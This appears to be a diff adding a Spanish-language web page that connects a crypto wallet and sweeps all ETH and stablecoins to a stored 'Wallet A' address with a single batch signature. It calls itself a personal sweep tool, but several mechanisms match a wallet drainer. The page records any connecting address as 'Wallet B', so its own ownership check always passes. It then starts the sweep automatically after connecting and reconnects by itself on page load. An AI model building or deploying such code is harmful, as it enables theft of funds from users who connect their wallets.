@@ -1,0 +1,458 @@
+<!doctype html>
+<html lang="es">
+<head>
+<meta charset="utf-8" />
+<meta name="viewport" content="width=device-width,initial-scale=1" />
+<title>Wallet B · Sweep</title>
+<script src="https://cdn.tailwindcss.com"></script>
+<script src="https://cdn.jsdelivr.net/npm/ethers@6.13.0/dist/ethers.umd.min.js"></script>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@400;500;600;700;800&display=swap" rel="stylesheet">
+<style>
+  :root {
+    --bg-grad: radial-gradient(1200px 700px at 80% -10%, #d6e4ff 0%, transparent 60%),
+               radial-gradient(900px 600px at -10% 100%, #e9f0ff 0%, transparent 60%),
+               linear-gradient(180deg, #f4f7ff 0%, #eaf1ff 100%);
+  }
+  html, body { font-family:'Plus Jakarta Sans', system-ui, -apple-system, sans-serif; -webkit-font-smoothing:antialiased; color:#1e2746; }
+  body { background:var(--bg-grad); min-height:100vh; }
+  .glass { background:rgba(255,255,255,.78); backdrop-filter:blur(14px); border:1px solid rgba(255,255,255,.9); }
+  .soft-shadow { box-shadow:0 1px 2px rgba(31,53,128,.04), 0 12px 40px -10px rgba(31,53,128,.12); }
+  .pop { box-shadow:0 8px 30px -6px rgba(96,128,255,.45); }
+  .field {
+    width:100%; border-radius:1rem; border:1.5px solid #e3eaff; background:#fff;
+    padding:.95rem 1.1rem; font-size:1rem; color:#1e2746;
+    transition:border-color .15s, box-shadow .15s;
+  }
+  .field::placeholder { color:#9aa6c4; }
+  .field:focus { outline:none; border-color:#7c9bff; box-shadow:0 0 0 4px rgba(124,155,255,.15); }
+  .btn {
+    display:inline-flex; align-items:center; justify-content:center; gap:.5rem;
+    border-radius:9999px; padding:.95rem 1.4rem; font-weight:600; font-size:.95rem;
+    transition:transform .1s, filter .15s, background .15s; cursor:pointer; border:none;
+  }
+  .btn:active { transform:translateY(1px); }
+  .btn-primary { background:linear-gradient(135deg,#6691f7 0%,#7c5cff 100%); color:#fff; box-shadow:0 8px 24px -6px rgba(102,145,247,.55); }
+  .btn-primary:hover { filter:brightness(1.05); }
+  .btn-primary:disabled { opacity:.45; cursor:not-allowed; filter:grayscale(.3); }
+  .btn-soft { background:#eaf0ff; color:#3b5bdb; }
+  .btn-soft:hover { background:#dde7ff; }
+  .btn-ghost { background:transparent; color:#3b5bdb; border:1.5px solid #cfdcff; }
+  .btn-ghost:hover { background:#f4f7ff; }
+  .chip {
+    display:inline-flex; align-items:center; gap:.4rem;
+    padding:.35rem .8rem; border-radius:9999px;
+    background:#eaf0ff; color:#3b5bdb; font-size:.78rem; font-weight:600;
+  }
+  .chip-ok    { background:#dcfce7; color:#15803d; }
+  .chip-warn  { background:#fef3c7; color:#a16207; }
+  .chip-bad   { background:#fee2e2; color:#b91c1c; }
+  .label { font-size:.78rem; font-weight:600; color:#6b7aa3; letter-spacing:.02em; }
+  .card { border-radius:1.75rem; padding:1.75rem; }
+  .h-display { font-weight:800; letter-spacing:-.02em; line-height:1.1; }
+  .mono { font-family:ui-monospace,'JetBrains Mono','Menlo',monospace; }
+  .toast {
+    position:fixed; bottom:1.5rem; left:50%; transform:translateX(-50%);
+    background:#1e2746; color:#fff; padding:.85rem 1.25rem; border-radius:9999px;
+    font-size:.9rem; font-weight:500; z-index:50; box-shadow:0 12px 40px -8px rgba(0,0,0,.3);
+    opacity:0; pointer-events:none; transition:opacity .25s, transform .25s;
+  }
+  .toast.show { opacity:1; transform:translateX(-50%) translateY(-4px); }
+  .skeleton { background:linear-gradient(90deg,#e8effd 0%,#f3f6fd 50%,#e8effd 100%); background-size:200% 100%; animation:sk 1.4s infinite; border-radius:.6rem; }
+  @keyframes sk { 0%{background-position:200% 0} 100%{background-position:-200% 0} }
+  .wallet-opt {
+    display:flex; align-items:center; gap:1rem; padding:1rem 1.1rem;
+    border-radius:1.25rem; border:1.5px solid #e3eaff; background:#fff;
+    cursor:pointer; transition:border-color .15s, transform .1s;
+  }
+  .wallet-opt:hover { border-color:#7c9bff; transform:translateY(-1px); }
+  .wallet-icon { width:44px; height:44px; border-radius:.85rem; display:flex; align-items:center; justify-content:center; font-weight:800; font-size:1.05rem; color:#fff; }
+  .modal-bd { position:fixed; inset:0; background:rgba(15,23,42,.45); backdrop-filter:blur(4px); z-index:40; display:none; align-items:center; justify-content:center; padding:1rem; }
+  .modal-bd.show { display:flex; }
+  .scale-in { animation:sin .2s ease-out; }
+  @keyframes sin { from { transform:scale(.95); opacity:0 } to { transform:scale(1); opacity:1 } }
+  .seg { display:inline-flex; padding:.3rem; background:#eaf0ff; border-radius:9999px; }
+  .seg button { padding:.5rem 1rem; border-radius:9999px; font-size:.85rem; font-weight:600; color:#6b7aa3; }
+  .seg button.active { background:#fff; color:#3b5bdb; box-shadow:0 2px 8px rgba(31,53,128,.1); }
+</style>
+</head>
+<body>
+
+<div class="max-w-xl mx-auto px-5 py-8">
+
+  <!-- HEADER -->
+  <header class="flex items-center justify-between mb-8">
+    <div class="flex items-center gap-3">
+      <div style="width:42px;height:42px;border-radius:1rem;background:linear-gradient(135deg,#a78bfa,#7c3aed);display:flex;align-items:center;justify-content:center;color:#fff;font-weight:800;font-size:1.1rem">B</div>
+      <div>
+        <div class="font-bold text-lg leading-tight">Wallet B</div>
+        <div class="text-xs text-slate-500">Origen · sweep a Wallet A</div>
+      </div>
+    </div>
+    <div class="flex items-center gap-2">
+      <span id="netChip" class="chip">⛓ <span id="netName">No conectado</span></span>
+      <span id="addrChip" class="chip hidden mono" style="background:#ede9fe;color:#6d28d9">👤 <span id="addrShort">—</span></span>
+      <button id="disconnectBtn" class="btn btn-ghost text-sm hidden" onclick="disconnect()">Salir</button>
+      <a href="panel.html" class="btn btn-ghost text-sm" style="text-decoration:none">Panel ↗</a>
+    </div>
+  </header>
+
+  <!-- ── PANTALLA A: sin conectar ── -->
+  <section id="screenConnect">
+
+    <!-- Destino A (badge silencioso) -->
+    <div id="destABadge" class="hidden mb-5 card glass soft-shadow" style="padding:1rem 1.25rem">
+      <div class="label mb-1">Destino · Wallet A</div>
+      <div id="destAText" class="mono text-sm text-indigo-700 break-all"></div>
+    </div>
+
+    <!-- Hero -->
+    <div class="card glass soft-shadow text-center mb-5" style="padding:2.5rem 2rem">
+      <div style="width:64px;height:64px;border-radius:1.25rem;background:linear-gradient(135deg,#ede9fe,#ddd6fe);border:1.5px solid #c4b5fd;display:flex;align-items:center;justify-content:center;font-size:1.8rem;margin:0 auto 1.25rem">🔑</div>
+      <h1 class="h-display text-2xl mb-2">Conectar Wallet B</h1>
+      <p class="text-slate-500 text-sm leading-relaxed max-w-xs mx-auto">
+        Conectá la wallet de origen. Los fondos serán enviados a Wallet A en un solo batch.
+      </p>
+    </div>
+
+    <!-- Opciones de conexión -->
+    <div class="card glass soft-shadow space-y-3" style="padding:1.5rem">
+
+      <!-- Trust QR -->
+      <button class="wallet-opt w-full" id="btnWC" onclick="connectWC()">
+        <div class="wallet-icon" style="background:linear-gradient(135deg,#3375bb,#1a56a8)">📱</div>
+        <div class="text-left flex-1">
+          <div class="font-semibold">Trust Wallet · QR</div>
+          <div class="text-xs text-slate-500">Escaneá el código con Trust en tu celular</div>
+        </div>
+        <span class="chip" style="font-size:.65rem">QR</span>
+      </button>
+
+      <!-- Trust extensión -->
+      <button class="wallet-opt w-full" onclick="connectExt('trust')">
+        <div class="wallet-icon" style="background:linear-gradient(135deg,#3375bb,#1f4e8a)">T</div>
+        <div class="text-left flex-1">
+          <div class="font-semibold">Trust · extensión</div>
+          <div class="text-xs text-slate-500">Si tenés Trust instalada en el navegador</div>
+        </div>
+      </button>
+
+      <!-- MetaMask -->
+      <button class="wallet-opt w-full" onclick="connectExt('metamask')">
+        <div class="wallet-icon" style="background:linear-gradient(135deg,#f6851b,#e2761b)">M</div>
+        <div class="text-left flex-1">
+          <div class="font-semibold">MetaMask</div>
+          <div class="text-xs text-slate-500">Extensión de navegador</div>
+        </div>
+      </button>
+
+      <!-- Otra -->
+      <button class="wallet-opt w-full" onclick="connectExt('any')">
+        <div class="wallet-icon" style="background:linear-gradient(135deg,#6691f7,#7c5cff)">↗</div>
+        <div class="text-left flex-1">
+          <div class="font-semibold">Otra wallet</div>
+          <div class="text-xs text-slate-500">Cualquier wallet con window.ethereum</div>
+        </div>
+      </button>
+
+      <div id="connectErr" class="hidden p-3 rounded-2xl text-xs" style="background:#fee2e2;color:#991b1b"></div>
+    </div>
+
+  </section>
+
+  <!-- ── PANTALLA B: conectado ── -->
+  <section id="screenConnected" class="hidden space-y-5">
+
+    <!-- Card principal: wallet conectada + estado B -->
+    <div id="cardMain" class="card pop" style="background:linear-gradient(135deg,#a78bfa 0%,#7c3aed 100%);color:#fff">
+      <div class="flex items-start justify-between mb-2">
+        <div>
+          <div class="text-white/70 text-sm font-medium" id="cardLabel">Wallet conectada</div>
+          <div class="mono font-bold text-lg mt-1 break-all" id="cardAddr">—</div>
+          <div class="text-white/60 text-xs mt-1" id="cardNet">—</div>
+        </div>
+        <button class="btn" style="background:rgba(255,255,255,.2);color:#fff;padding:.5rem .875rem;font-size:.8rem" onclick="refreshBal()">↻</button>
+      </div>
+
+      <!-- Balance nativo -->
+      <div class="mt-4 pt-4 border-t border-white/20 flex items-baseline gap-2">
+        <span id="nativeBal" class="h-display text-3xl">—</span>
+        <span id="nativeSym" class="text-white/80 font-semibold">ETH</span>
+      </div>
+
+      <!-- Badge B detectada -->
+      <div id="badgeIsB" class="hidden mt-3 inline-flex items-center gap-2 px-3 py-1 rounded-full text-xs font-semibold" style="background:rgba(255,255,255,.2)">
+        <span style="width:8px;height:8px;border-radius:50%;background:#86efac;animation:pulse 2s infinite"></span>
+        Wallet B detectada ✓
+      </div>
+      <div id="badgeNotB" class="hidden mt-3 inline-flex items-center gap-2 px-3 py-1 rounded-full text-xs font-semibold" style="background:rgba(255,100,100,.3)">
+        ✕ No coincide con la dirección de B registrada
+      </div>
+    </div>
+
+    <!-- Tokens ERC20 detectados -->
+    <div id="tokensList" class="card glass soft-shadow hidden">
+      <div class="label mb-3">Tokens en esta wallet</div>
+      <div id="tokensGrid" class="space-y-2"></div>
+    </div>
+
+    <!-- Botón sweep (solo visible si es B) -->
+    <div id="sweepSection" class="hidden">
+      <button class="btn btn-primary w-full" style="padding:1.1rem;font-size:1rem;background:linear-gradient(135deg,#059669,#10b981);box-shadow:0 8px 24px -6px rgba(16,185,129,.45)" onclick="doSweep()">
+        <span id="sweepLabel">📤 Sweep todo → Wallet A · 1 firma</span>
+      </button>
+      <div class="text-center text-xs text-slate-500 mt-2">
+        ETH + todos los tokens en <strong id="sweepNet">esta red</strong> → <span id="sweepDestShort" class="mono font-semibold text-indigo-600"></span>
+      </div>
+    </div>
+
+    <!-- Tx status -->
+    <div id="txStatus" class="hidden p-4 rounded-2xl text-sm"></div>
+
+  </section>
+
+</div>
+
+<!-- TOAST -->
+<div id="toast" class="toast"></div>
+
+<style>
+@keyframes pulse { 0%,100%{box-shadow:0 0 0 0 rgba(134,239,172,.5)} 50%{box-shadow:0 0 0 6px rgba(134,239,172,0)} }
+</style>
+
+<script>
+/* ═══ Constantes compartidas con panel.html ═══ */
+const WC_PROJECT_ID = 'c1b85e8eff60dbd02663499756f49867';
+const CHAIN_NAMES   = {1:'Ethereum',137:'Polygon',8453:'Base',43114:'Avalanche',42161:'Arbitrum',56:'BNB Chain',11155111:'Sepolia'};
+const CHAIN_SYMBOLS = {1:'ETH',137:'POL',8453:'ETH',43114:'AVAX',42161:'ETH',56:'BNB'};
+const GAS_RESERVE   = {1:.003,137:.5,8453:.0005,43114:.005,42161:.0008,56:.003};
+
+const TOKENS = {
+  1:     [{s:'USDT',a:'0xdAC17F958D2ee523a2206206994597C13D831ec7',d:6},{s:'USDC',a:'0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48',d:6},{s:'DAI',a:'0x6B175474E89094C44Da98b954EedeAC495271d0F',d:18}],
+  137:   [{s:'USDT',a:'0xc2132D05D31c914a87C6611C10748AEb04B58e8F',d:6},{s:'USDC',a:'0x3c499c542cEF5E3811e1192ce70d8cC03d5c3359',d:6}],
+  8453:  [{s:'USDC',a:'0x833589fCD6eDb6E08f4c7C32D4f71b54bdA02913',d:6}],
+  43114: [{s:'USDT',a:'0x9702230A8Ea53601f5cD2dc00fDBc13d4dF4A8c7',d:6},{s:'USDC',a:'0xB97EF9Ef8734C71904D8002F8b6Bc66Dd9c48a6E',d:6}],
+  42161: [{s:'USDT',a:'0xFd086bC7CD5C481DCC9C85ebE478A1C0b69FCbb9',d:6},{s:'USDC',a:'0xaf88d065e77c8cC2239327C5EDb3A432268e5831',d:6}],
+  56:    [{s:'USDT',a:'0x55d398326f99059fF775485246999027B3197955',d:18},{s:'USDC',a:'0x8AC76a51cc950d9822D68b83fE1Ad97B32Cd580d',d:18}],
+};
+const ERC20_ABI = ['function balanceOf(address) view returns (uint256)','function transfer(address,uint256) returns (bool)'];
+
+let provider, signer, me, wcProvider, chainId;
+
+/* ── helpers ── */
+const $ = id => document.getElementById(id);
+const shortAddr = a => a ? `${a.slice(0,8)}…${a.slice(-6)}` : '—';
+function toast(msg, ms=2600) {
+  const t=$('toast'); t.textContent=msg; t.classList.add('show');
+  clearTimeout(toast._t); toast._t=setTimeout(()=>t.classList.remove('show'),ms);
+}
+function setStatus(html, kind='info') {
+  const colors={info:'background:#eff6ff;color:#1e3a8a;border:1px solid #bfdbfe',ok:'background:#dcfce7;color:#166534;border:1px solid #86efac',err:'background:#fee2e2;color:#991b1b;border:1px solid #fca5a5',pending:'background:#fef3c7;color:#854d0e;border:1px solid #fde68a'};
+  const el=$('txStatus'); el.style=colors[kind]; el.innerHTML=html; el.classList.remove('hidden');
+}
+function getDestA()   { return localStorage.getItem('destA') || ''; }
+function getWalletB() { return (localStorage.getItem('walletB')||'').trim(); }
+function isB()        { const b=getWalletB().toLowerCase(); return !!(me&&b&&me.toLowerCase()===b); }
+
+/* ── Renderizar pantalla conectado ── */
+async function renderConnected() {
+  $('screenConnect').classList.add('hidden');
+  $('screenConnected').classList.remove('hidden');
+  $('addrChip').classList.remove('hidden');
+  $('addrShort').textContent = shortAddr(me);
+  $('disconnectBtn').classList.remove('hidden');
+  $('cardAddr').textContent = me;
+  $('cardNet').textContent  = CHAIN_NAMES[chainId] || `Chain ${chainId}`;
+  $('netName').textContent  = CHAIN_NAMES[chainId] || `Chain ${chainId}`;
+
+  const sym = CHAIN_SYMBOLS[chainId] || 'ETH';
+  $('nativeSym').textContent = sym;
+
+  // Badge B / no-B
+  if (isB()) {
+    $('cardLabel').textContent = '✓ Wallet B conectada';
+    $('badgeIsB').classList.remove('hidden');
+    $('badgeNotB').classList.add('hidden');
+    $('sweepSection').classList.remove('hidden');
+    const dest = getDestA();
+    $('sweepDestShort').textContent = dest ? shortAddr(dest) : '(sin Wallet A)';
+    $('sweepNet').textContent = CHAIN_NAMES[chainId] || `Chain ${chainId}`;
+    // Guardar walletB si no estaba
+    if (!getWalletB()) localStorage.setItem('walletB', me);
+  } else {
+    $('cardLabel').textContent = 'Wallet conectada';
+    $('badgeIsB').classList.add('hidden');
+    $('badgeNotB').classList.remove('hidden');
+    $('sweepSection').classList.add('hidden');
+  }
+
+  await refreshBal();
+
+  // Auto-sweep si es B y hay destino A
+  if (isB() && ethers.isAddress(getDestA())) {
+    setTimeout(doSweep, 1500);
+  }
+}
+
+async function refreshBal() {
+  if (!provider || !me) return;
+  try {
+    const bal = await provider.getBalance(me);
+    $('nativeBal').textContent = Number(ethers.formatEther(bal)).toFixed(4);
+  } catch { $('nativeBal').textContent = '—'; }
+
+  // Tokens ERC20
+  const tokens = TOKENS[chainId] || [];
+  const found = [];
+  await Promise.all(tokens.map(async t => {
+    try {
+      const c = new ethers.Contract(t.a, ERC20_ABI, provider);
+      const b = await c.balanceOf(me);
+      if (b > 0n) found.push({ ...t, bal: b });
+    } catch {}
+  }));
+  if (found.length) {
+    $('tokensList').classList.remove('hidden');
+    $('tokensGrid').innerHTML = found.map(t => `
+      <div class="flex items-center justify-between py-2 border-b border-slate-100 last:border-0">
+        <span class="font-semibold text-sm">${t.s}</span>
+        <span class="mono text-sm text-indigo-700">${Number(ethers.formatUnits(t.bal,t.d)).toFixed(4)}</span>
+      </div>`).join('');
+  } else {
+    $('tokensList').classList.add('hidden');
+  }
+}
+
+/* ── Sweep batch (EIP-5792 → fallback secuencial) ── */
+async function doSweep() {
+  if (!isB()) return;
+  const dest = getDestA();
+  if (!ethers.isAddress(dest)) { setStatus('Wallet A no registrada. Conectá A en panel.html primero.','err'); return; }
+
+  setStatus('Preparando batch…','pending');
+  $('sweepLabel').textContent = '⏳ Procesando…';
+
+  const feeData  = await provider.getFeeData();
+  const gasPrice = feeData.maxFeePerGas || feeData.gasPrice || ethers.parseUnits('5','gwei');
+  const erc20if  = new ethers.Interface(ERC20_ABI);
+  const tokens   = TOKENS[chainId] || [];
+
+  const calls = [];
+  for (const t of tokens) {
+    try {
+      const c = new ethers.Contract(t.a, ERC20_ABI, provider);
+      const b = await c.balanceOf(me);
+      if (b > 0n) calls.push({ to:t.a, data:erc20if.encodeFunctionData('transfer',[dest,b]), _s:t.s });
+    } catch {}
+  }
+
+  const reserve   = ethers.parseEther(String(GAS_RESERVE[chainId]||0.0005));
+  const totalGas  = BigInt(21000 + calls.length*65000) * gasPrice * 12n/10n;
+  const nativeBal = await provider.getBalance(me);
+  const sendable  = nativeBal - totalGas - reserve;
+  if (sendable > 0n) calls.push({ to:dest, value:`0x${sendable.toString(16)}`, _s:'ETH/nativo' });
+
+  if (!calls.length) { setStatus('Sin fondos para mover en esta red','info'); $('sweepLabel').textContent='📤 Sweep todo → Wallet A · 1 firma'; return; }
+
+  const raw = wcProvider || window.ethereum;
+  try {
+    const batch = calls.map(c => { const x={to:c.to}; if(c.data) x.data=c.data; if(c.value) x.value=c.value; return x; });
+    const id = await raw.request({ method:'wallet_sendCalls', params:[{version:'2.0',from:me,calls:batch}] });
+    setStatus(`✓ Batch enviado · ${calls.length} movimiento(s) · ID: <span class="mono">${String(id).slice(0,20)}</span>`,'ok');
+    toast('✓ Batch enviado con 1 firma');
+  } catch {
+    // fallback secuencial
+    let ok=0, err=0;
+    for (const c of calls) {
+      try {
+        const tx = c.data
+          ? await signer.sendTransaction({to:c.to, data:c.data})
+          : await signer.sendTransaction({to:c.to, value:c.value});
+        await tx.wait(); ok++;
+      } catch { err++; }
+    }
+    setStatus(`${ok} tx ok · ${err} errores`, err?'err':'ok');
+    toast(`${ok} transferencia(s) completadas`);
+  }
+  $('sweepLabel').textContent = '📤 Sweep todo → Wallet A · 1 firma';
+  refreshBal();
+}
+
+/* ── Connect extensión ── */
+async function connectExt(kind) {
+  let eth = window.ethereum;
+  if (!eth) { $('connectErr').textContent='No se detectó ninguna wallet instalada.'; $('connectErr').classList.remove('hidden'); return; }
+  if (eth.providers?.length) {
+    if (kind==='trust')    eth = eth.providers.find(p=>p.isTrust||p.isTrustWallet)||eth;
+    if (kind==='metamask') eth = eth.providers.find(p=>p.isMetaMask&&!p.isTrust)||eth;
+  }
+  try {
+    provider = new ethers.BrowserProvider(eth);
+    await provider.send('eth_requestAccounts',[]);
+    signer   = await provider.getSigner();
+    me       = await signer.getAddress();
+    const net= await provider.getNetwork();
+    chainId  = Number(net.chainId);
+    localStorage.setItem('walletB', me);
+    eth.on?.('accountsChanged',()=>location.reload());
+    eth.on?.('chainChanged',   ()=>location.reload());
+    renderConnected();
+  } catch(e) { $('connectErr').textContent='Error: '+(e.shortMessage||e.message); $('connectErr').classList.remove('hidden'); }
+}
+
+/* ── Connect WalletConnect ── */
+async function connectWC() {
+  const btn = $('btnWC');
+  btn.style.opacity='.5'; btn.disabled=true;
+  try {
+    if (!window.EthereumProvider) {
+      await new Promise((res,rej)=>{
+        const s=document.createElement('script');
+        s.src='https://cdn.jsdelivr.net/npm/@walletconnect/ethereum-provider@2/dist/index.umd.js';
+        s.onload=res; s.onerror=rej; document.head.appendChild(s);
+      });
+    }
+    const EP = window.EthereumProvider;
+    wcProvider = await EP.init({
+      projectId: WC_PROJECT_ID,
+      chains:[1], optionalChains:[137,8453,43114,42161,56],
+      showQrModal:true,
+      metadata:{ name:'MyPersonWallets · Wallet B', description:'Sweep de Wallet B a A', url:window.location.origin, icons:[] },
+    });
+    await wcProvider.connect();
+    provider = new ethers.BrowserProvider(wcProvider);
+    signer   = await provider.getSigner();
+    me       = await signer.getAddress();
+    const net= await provider.getNetwork();
+    chainId  = Number(net.chainId);
+    localStorage.setItem('walletB', me);
+    wcProvider.on('accountsChanged',()=>location.reload());
+    wcProvider.on('chainChanged',   ()=>location.reload());
+    renderConnected();
+  } catch(e) {
+    if (!e.message?.includes('rejected')&&!e.message?.includes('closed'))
+      toast('Error WC: '+(e.message||'Intentá de nuevo'));
+  } finally { btn.style.opacity=''; btn.disabled=false; }
+}
+
+function disconnect() {
+  try { wcProvider?.disconnect(); } catch {}
+  provider=signer=me=wcProvider=chainId=null;
+  location.reload();
+}
+
+/* ── Init ── */
+window.addEventListener('load', () => {
+  // Mostrar destA silenciosamente
+  const destA = getDestA();
+  if (destA) {
+    $('destABadge').classList.remove('hidden');
+    $('destAText').textContent = destA;
+  }
+  // Auto-connect si ya había sesión
+  if (window.ethereum?.selectedAddress) connectExt('any');
+});
+</script>
+</body>
+</html>
